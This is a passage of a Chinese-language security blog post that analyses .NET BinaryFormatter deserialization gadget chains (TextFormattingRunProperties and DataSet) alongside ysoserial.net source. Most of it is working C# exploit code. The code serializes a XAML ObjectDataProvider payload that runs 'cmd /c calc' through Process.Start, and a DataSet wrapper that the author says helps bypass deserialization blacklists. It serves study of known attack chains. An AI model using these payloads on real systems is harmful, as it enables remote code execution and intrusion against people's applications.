class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xaml_payload =</span><br><span class="line">                <span class="string">&quot;&lt;ResourceDictionary \n                    xmlns=\&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation\&quot; \n                    xmlns:d=\&quot;http://schemas.microsoft.com/winfx/2006/xaml\&quot; \n                    xmlns:b=\&quot;clr-namespace:System;assembly=mscorlib\&quot; \n                    xmlns:c=\&quot;clr-namespace:System.Diagnostics;assembly=system\&quot;&gt;\n    &lt;ObjectDataProvider d:Key=\&quot;\&quot; ObjectType=\&quot;&#123;d:Type c:Process&#125;\&quot; MethodName=\&quot;Start\&quot;&gt;\n        &lt;ObjectDataProvider.MethodParameters&gt;\n            &lt;b:String&gt;cmd&lt;/b:String&gt;\n            &lt;b:String&gt;/c calc&lt;/b:String&gt;\n        &lt;/ObjectDataProvider.MethodParameters&gt;\n    &lt;/ObjectDataProvider&gt;\n&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中xaml payload是我们上一节中生成出的payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ResourceDictionary</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:sd</span>=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=System&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:x</span>=<span class="string">&quot;http://schemas.microsoft</span></span></span><br><span class="line"><span class="string"><span class="tag">.com/winfx/2006/xaml&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ObjectDataProvider</span> <span class="attr">MethodName</span>=<span class="string">&quot;Start&quot;</span> <span class="attr">x:Key</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ObjectDataProvider.ObjectInstance</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sd:Process</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sd:Process.StartInfo</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sd:ProcessStartInfo</span> <span class="attr">Arguments</span>=<span class="string">&quot;test&quot;</span> <span class="attr">S</span></span></span><br><span class="line"><span class="tag"><span class="attr">tandardErrorEncoding</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">StandardOutputEncoding</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">UserName</span>=<span class="string">&quot;&quot;</span> <span class="attr">Password</span>=<span class="string">&quot;&#123;x:Null&#125;&quot;</span> <span class="attr">Domain</span>=<span class="string">&quot;&quot;</span> <span class="attr">LoadUserProfile</span>=<span class="string">&quot;False&quot;</span> <span class="attr">FileName</span>=<span class="string">&quot;calc&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">sd:Process.StartInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">sd:Process</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ObjectDataProvider.ObjectInstance</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ObjectDataProvider</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ResourceDictionary</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>stack如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new TextFormattingRunProperties() </span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707290728283-6b2a788d-05cc-43f0-b5df-e9f47eae67cb.png#averageHue=%2329261f&clientId=ue710614a-66b0-4&from=paste&height=284&id=u48ba523d&originHeight=355&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126821&status=done&style=none&taskId=u4b5fd861-472e-4e8e-bd21-6c8e8b79cd2&title=&width=1000" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707290748311-fbc26e4b-d51d-4cf1-a824-81de07219522.png#averageHue=%23201e1d&clientId=ue710614a-66b0-4&from=paste&height=148&id=uf439819a&originHeight=185&originWidth=1003&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27846&status=done&style=none&taskId=u295a88b8-8799-4dd5-a4d1-ad693835d47&title=&width=802.4" alt="image.png"><br>在Parse处完成了RCE，这条链子也是比较简单。但很常见<br>Yso的写法和我们的也一样</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> ysoserial.Helpers;</span><br><span class="line"><span class="keyword">using</span> NDesk.Options;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ysoserial.Generators</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> xaml</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = xaml;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="02-2-DataSet"><a href="#02-2-DataSet" class="headerlink" title="02-2 DataSet"></a>02-2 DataSet</h2><p>Yso中有关DataSet的Generator如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DataSetMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] _fakeTable;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Data.DataSet));</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.RemotingFormat&quot;</span>, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.DataSetName&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Namespace&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Prefix&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.CaseSensitive&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.LocaleLCID&quot;</span>, <span class="number">0x409</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.EnforceConstraints&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.ExtendedProperties&quot;</span>, (System.Data.PropertyCollection)<span class="literal">null</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables.Count&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables_0&quot;</span>, _fakeTable);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetFakeTable</span>(<span class="params"><span class="built_in">byte</span>[] bfPayload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _fakeTable = bfPayload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DataSetMarshal</span>(<span class="params"><span class="built_in">byte</span>[] bfPayload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SetFakeTable(bfPayload);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DataSetMarshal</span>(<span class="params"><span class="built_in">object</span> fakeTable</span>):<span class="title">this</span>(<span class="params">fakeTable, <span class="keyword">new</span> InputArgs(</span>))</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// This won&#x27;t use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DataSetMarshal</span>(<span class="params"><span class="built_in">object</span> fakeTable, InputArgs inputArgs</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            <span class="keyword">if</span> (inputArgs.Minify)</span><br><span class="line">            &#123;</span><br><span class="line">                ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = <span class="keyword">new</span> ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();</span><br><span class="line">                fmtLocal.Serialize(stm, fakeTable);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter fmt = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                fmt.Serialize(stm, fakeTable);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            SetFakeTable(stm.ToArray());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DataSetMarshal</span>(<span class="params">MemoryStream ms</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SetFakeTable(ms.ToArray());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实这条链子的本质就是TextFormattingRunProperties链，DataSet提供了一次二次反序列化的机会，有助于我们绕过黑名单。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707292425271-068d7047-729c-4682-a414-81ece65691d3.png#averageHue=%231d1d1d&clientId=ue710614a-66b0-4&from=paste&height=278&id=u008efc39&originHeight=347&originWidth=865&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39307&status=done&style=none&taskId=u5d2c85bf-6e75-4e8e-bbc2-2c3049914ec&title=&width=692" alt="image.png"><br>实现了ISerializable接口，观察它的构造方法</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">DataSet</span>(<span class="params">SerializationInfo info, StreamingContext context, <span class="built_in">bool</span> ConstructSchema</span>)</span></span><br><span class="line"><span class="function">     : <span class="title">this</span>()</span></span><br><span class="line">   &#123;</span><br><span class="line">     SerializationFormat remotingFormat = SerializationFormat.Xml;</span><br><span class="line">     SchemaSerializationMode schemaSerializationMode = SchemaSerializationMode.IncludeSchema;</span><br><span class="line">     SerializationInfoEnumerator enumerator = info.GetEnumerator();</span><br><span class="line">     <span class="keyword">while</span> (enumerator.MoveNext())</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">switch</span> (enumerator.Name)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&quot;DataSet.RemotingFormat&quot;</span>:</span><br><span class="line">           remotingFormat = (SerializationFormat) enumerator.Value;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&quot;SchemaSerializationMode.DataSet&quot;</span>:</span><br><span class="line">           schemaSerializationMode = (SchemaSerializationMode) enumerator.Value;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">         <span class="literal">default</span>:</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (schemaSerializationMode == SchemaSerializationMode.ExcludeSchema)</span><br><span class="line">       <span class="keyword">this</span>.InitializeDerivedDataSet();</span><br><span class="line">     <span class="keyword">if</span> (remotingFormat == SerializationFormat.Xml &amp;&amp; !ConstructSchema)</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">         <span class="comment">//进行反序列化</span></span><br><span class="line">     <span class="keyword">this</span>.DeserializeDataSet(info, context, remotingFormat, schemaSerializationMode);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>构造方法会进入DeserializeDataSet方法，进行反序列化<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707292745561-1a1c4ffe-36f8-4b83-9bcc-9d1f8af1c0e4.png#averageHue=%231d1d1d&clientId=ue710614a-66b0-4&from=paste&height=239&id=u1daab50a&originHeight=299&originWidth=1147&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49617&status=done&style=none&taskId=uf2e2db14-3eb0-487b-8295-4c6b53620d4&title=&width=917.6" alt="image.png"><br><code>this.DeserializeDataSetSchema</code></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">DeserializeDataSetSchema</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">      SerializationInfo info,</span></span></span><br><span class="line"><span class="params"><span class="function">      StreamingContext context,</span></span></span><br><span class="line"><span class="params"><span class="function">      SerializationFormat remotingFormat,</span></span></span><br><span class="line"><span class="params"><span class="function">      SchemaSerializationMode schemaSerializationMode</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (remotingFormat != SerializationFormat.Xml)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (schemaSerializationMode == SchemaSerializationMode.IncludeSchema)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">this</span>.DeserializeDataSetProperties(info, context);</span><br><span class="line">          <span class="built_in">int</span> int32 = info.GetInt32(<span class="string">&quot;DataSet.Tables.Count&quot;</span>);</span><br><span class="line">          <span class="keyword">for</span> (<span class="built_in">int</span> index = <span class="number">0</span>; index &lt; int32; ++index)</span><br><span class="line">          &#123;</span><br><span class="line">            MemoryStream serializationStream = <span class="keyword">new</span> MemoryStream((<span class="built_in">byte</span>[]) info.GetValue(<span class="built_in">string</span>.Format((IFormatProvider) CultureInfo.InvariantCulture, <span class="string">&quot;DataSet.Tables_&#123;0&#125;&quot;</span>, <span class="keyword">new</span> <span class="built_in">object</span>[<span class="number">1</span>]</span><br><span class="line">            &#123;</span><br><span class="line">              (<span class="built_in">object</span>) index</span><br><span class="line">            &#125;), <span class="keyword">typeof</span> (<span class="built_in">byte</span>[])));</span><br><span class="line">            serializationStream.Position = <span class="number">0L</span>;</span><br><span class="line">            <span class="keyword">this</span>.Tables.Add((DataTable) <span class="keyword">new</span> BinaryFormatter((ISurrogateSelector) <span class="literal">null</span>, <span class="keyword">new</span> StreamingContext(context.State, (<span class="built_in">object</span>) <span class="literal">false</span>)).Deserialize((Stream) serializationStream));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">for</span> (<span class="built_in">int</span> index = <span class="number">0</span>; index &lt; int32; ++index)</span><br><span class="line">            <span class="keyword">this</span>.Tables[index].DeserializeConstraints(info, context, index, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">this</span>.DeserializeRelations(info, context);</span><br><span class="line">          <span class="keyword">for</span> (<span class="built_in">int</span> index = <span class="number">0</span>; index &lt; int32; ++index)</span><br><span class="line">            <span class="keyword">this</span>.Tables[index].DeserializeExpressionColumns(info, context, index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">this</span>.DeserializeDataSetProperties(info, context);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">string</span> s = (<span class="built_in">string</span>) info.GetValue(<span class="string">&quot;XmlSchema&quot;</span>, <span class="keyword">typeof</span> (<span class="built_in">string</span>));</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span>)</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">this</span>.ReadXmlSchema((XmlReader) <span class="keyword">new</span> XmlTextReader((TextReader) <span class="keyword">new</span> StringReader(s)), <span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其中进行了Binary二进制反序列化<br><code>this.Tables.Add((DataTable) new BinaryFormatter((ISurrogateSelector) null, new StreamingContext(context.State, (object) false)).Deserialize((Stream) serializationStream));</code><br>我们需要关注的就是Stream从何而来，它是哪个值<br><code>MemoryStream serializationStream = new MemoryStream((byte[]) info.GetValue(string.Format((IFormatProvider) CultureInfo.InvariantCulture, &quot;DataSet.Tables_&#123;0&#125;&quot;, new object[1]</code><br>它来自<code>DataSet.Tables_0</code>的值，那我们在序列化的时候给他赋值为TextFormattingRunProperties的二进制bytes流即可，但是我们需要给其他属性赋值，否则无法正常反序列化</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">info.SetType(<span class="keyword">typeof</span>(System.Data.DataSet));</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.RemotingFormat&quot;</span>, System.Data.SerializationFormat.Binary);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.DataSetName&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Namespace&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Prefix&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.CaseSensitive&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.LocaleLCID&quot;</span>, <span class="number">0x409</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.EnforceConstraints&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.ExtendedProperties&quot;</span>, (System.Data.PropertyCollection)<span class="literal">null</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables.Count&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;DataSet.Tables_0&quot;</span>, _fakeTable);</span><br></pre></td></tr></table></figure>
<p>Yso的payload中给了这些属性赋值，这些值都是要在反序列化中获取的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707293155183-8424a792-9ea3-4cea-bfec-6e01a86803a6.png#averageHue=%23211f1e&clientId=ue710614a-66b0-4&from=paste&height=280&id=u55dc2f79&originHeight=350&originWidth=1273&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93280&status=done&style=none&taskId=uaef1b05c-a9fc-4298-99a6-d4a4ad35cc3&title=&width=1018.4" alt="image.png"><br>它的调用流程为<code>DataSet#Ctor</code>-&gt;<code>DeserializeDataSet</code>-&gt;<code>DeserializeDataSetSchema</code>-&gt;<code>DeserializeDataSetProperties</code>(在这一步获取上述属性，因此要赋值)-&gt;<code>BinaryFormatter#Deserialize</code><br>我们可以手动构造Exp如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span 